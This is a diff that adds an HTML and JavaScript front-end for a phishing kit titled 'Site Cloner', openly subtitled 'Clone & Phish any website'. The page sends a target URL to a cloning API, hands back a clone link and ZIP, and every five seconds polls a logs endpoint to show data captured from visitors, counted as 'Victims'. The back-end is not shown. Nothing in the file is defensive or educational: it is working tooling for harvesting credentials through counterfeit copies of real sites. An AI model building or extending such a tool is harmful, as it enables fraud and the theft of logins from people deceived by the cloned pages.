@@ -1,1 +1,246 @@
-
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Cloner</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#0a0a0f;
+            color:#e0e0e0;
+            font-family:-apple-system,BlinkMacSystemFont,sans-serif;
+            min-height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            padding:20px;
+        }
+        .container{max-width:500px;width:100%}
+        h1{
+            text-align:center;
+            font-size:32px;
+            margin-bottom:5px;
+            background:linear-gradient(135deg,#667eea,#f5576c);
+            -webkit-background-clip:text;
+            -webkit-text-fill-color:transparent;
+        }
+        .sub{text-align:center;color:#666;margin-bottom:30px;font-size:14px}
+        .card{
+            background:#111122;
+            border-radius:16px;
+            padding:25px;
+            margin-bottom:15px;
+            border:1px solid #222;
+        }
+        label{display:block;margin-bottom:8px;color:#aaa;font-size:14px}
+        input{
+            width:100%;
+            padding:14px 16px;
+            border:1px solid #333;
+            border-radius:12px;
+            background:#0a0a14;
+            color:#fff;
+            font-size:16px;
+            margin-bottom:15px;
+            transition:border-color 0.2s;
+        }
+        input:focus{outline:none;border-color:#667eea}
+        button{
+            width:100%;
+            padding:15px;
+            border:none;
+            border-radius:12px;
+            font-size:16px;
+            font-weight:600;
+            cursor:pointer;
+            color:#fff;
+            transition:opacity 0.2s;
+        }
+        button:hover{opacity:0.85}
+        button:disabled{opacity:0.4;cursor:not-allowed}
+        .btn-clone{background:linear-gradient(135deg,#667eea,#764ba2)}
+        .btn-phantom{background:linear-gradient(135deg,#f093fb,#f5576c);margin-top:10px}
+        .result{
+            margin-top:20px;
+            padding:20px;
+            border-radius:12px;
+            display:none;
+            word-break:break-all;
+        }
+        .result.show{display:block}
+        .result.success{background:#0a2a0a;border:1px solid #0f0}
+        .result.error{background:#2a0a0a;border:1px solid #f00}
+        .result a{color:#667eea}
+        .result .btn-dl{
+            display:inline-block;
+            background:#667eea;
+            color:#fff;
+            padding:10px 20px;
+            border-radius:8px;
+            text-decoration:none;
+            margin-top:10px;
+            font-size:14px;
+        }
+        .loading{
+            display:none;
+            text-align:center;
+            padding:15px;
+            color:#888;
+        }
+        .spinner{
+            width:30px;height:30px;
+            border:3px solid #333;
+            border-top-color:#667eea;
+            border-radius:50%;
+            animation:spin 0.8s linear infinite;
+            margin:0 auto 10px;
+        }
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .log-line{
+            background:#0a0a14;
+            padding:8px;
+            margin:3px 0;
+            border-radius:5px;
+            font-size:12px;
+            font-family:monospace;
+            color:#0f0;
+        }
+        .stats{display:flex;gap:10px;margin-bottom:15px}
+        .stat{
+            flex:1;
+            text-align:center;
+            padding:10px;
+            background:#0a0a14;
+            border-radius:8px;
+        }
+        .stat .num{font-size:24px;color:#667eea}
+        .stat .lbl{font-size:11px;color:#888}
+        .preview{
+            width:100%;
+            border-radius:12px;
+            margin-top:10px;
+            border:1px solid #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CLONER</h1>
+        <p class="sub">Clone & Phish any website</p>
+        
+        <div class="card">
+            <label>Website URL</label>
+            <input type="text" id="urlInput" placeholder="https://example.com" autofocus>
+            <button class="btn-clone" onclick="cloneSite()" id="cloneBtn">CLONE SITE</button>
+        </div>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <div>Cloning...</div>
+        </div>
+        
+        <div class="result" id="result">
+            <div class="stats">
+                <div class="stat"><div class="num" id="statAssets">0</div><div class="lbl">Files</div></div>
+                <div class="stat"><div class="num" id="statForms">0</div><div class="lbl">Forms</div></div>
+                <div class="stat"><div class="num" id="statLogs">0</div><div class="lbl">Victims</div></div>
+            </div>
+            <div><b>Clone URL:</b></div>
+            <a href="#" target="_blank" id="cloneUrl">-</a>
+            <br><br>
+            <a href="#" class="btn-dl" id="downloadBtn">DOWNLOAD ZIP</a>
+            <button class="btn-phantom" onclick="copyUrl()">COPY URL</button>
+            <br><br>
+            <div><b>Logs URL:</b></div>
+            <a href="#" target="_blank" id="logsUrl">-</a>
+            <div id="logsPreview"></div>
+        </div>
+    </div>
+    
+    <script>
+        var currentId = '';
+        var currentCloneUrl = '';
+        
+        async function cloneSite() {
+            var url = document.getElementById('urlInput').value.trim();
+            if (!url) return alert('Enter URL');
+            
+            var btn = document.getElementById('cloneBtn');
+            var loading = document.getElementById('loading');
+            var result = document.getElementById('result');
+            
+            btn.disabled = true;
+            loading.style.display = 'block';
+            result.classList.remove('show');
+            
+            try {
+                var resp = await fetch('/api/clone', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({url: url})
+                });
+                
+                var data = await resp.json();
+                
+                if (data.error) {
+                    result.innerHTML = '<b>Error:</b> ' + data.error;
+                    result.classList.add('show', 'error');
+                } else {
+                    currentId = data.id;
+                    currentCloneUrl = data.url;
+                    
+                    document.getElementById('statAssets').textContent = data.assets;
+                    document.getElementById('statForms').textContent = data.forms;
+                    document.getElementById('cloneUrl').href = data.url;
+                    document.getElementById('cloneUrl').textContent = data.url;
+                    document.getElementById('downloadBtn').href = data.download;
+                    document.getElementById('logsUrl').href = '/api/logs/' + data.id;
+                    document.getElementById('logsUrl').textContent = '/api/logs/' + data.id;
+                    
+                    result.classList.add('show', 'success');
+                    
+                    // Периодически проверяем логи
+                    setInterval(async function() {
+                        try {
+                            var lr = await fetch('/api/logs/' + currentId);
+                            var ld = await lr.json();
+                            document.getElementById('statLogs').textContent = ld.count;
+                            if (ld.logs.length > 0) {
+                                var preview = '';
+                                ld.logs.slice(-3).forEach(function(l) {
+                                    preview += '<div class="log-line">';
+                                    for (var k in l) {
+                                        if (k !== 'ua') preview += k + ':' + l[k] + ' ';
+                                    }
+                                    preview += '</div>';
+                                });
+                                document.getElementById('logsPreview').innerHTML = preview;
+                            }
+                        } catch(e) {}
+                    }, 5000);
+                }
+            } catch(e) {
+                result.innerHTML = '<b>Error:</b> ' + e.message;
+                result.classList.add('show', 'error');
+            }
+            
+            btn.disabled = false;
+            loading.style.display = 'none';
+        }
+        
+        function copyUrl() {
+            if (currentCloneUrl) {
+                navigator.clipboard.writeText(currentCloneUrl).then(function() {
+                    alert('URL copied!');
+                });
+            }
+        }
+        
+        // Enter key to submit
+        document.getElementById('urlInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') cloneSite();
+        });
+    </script>
+</body>
+</html>
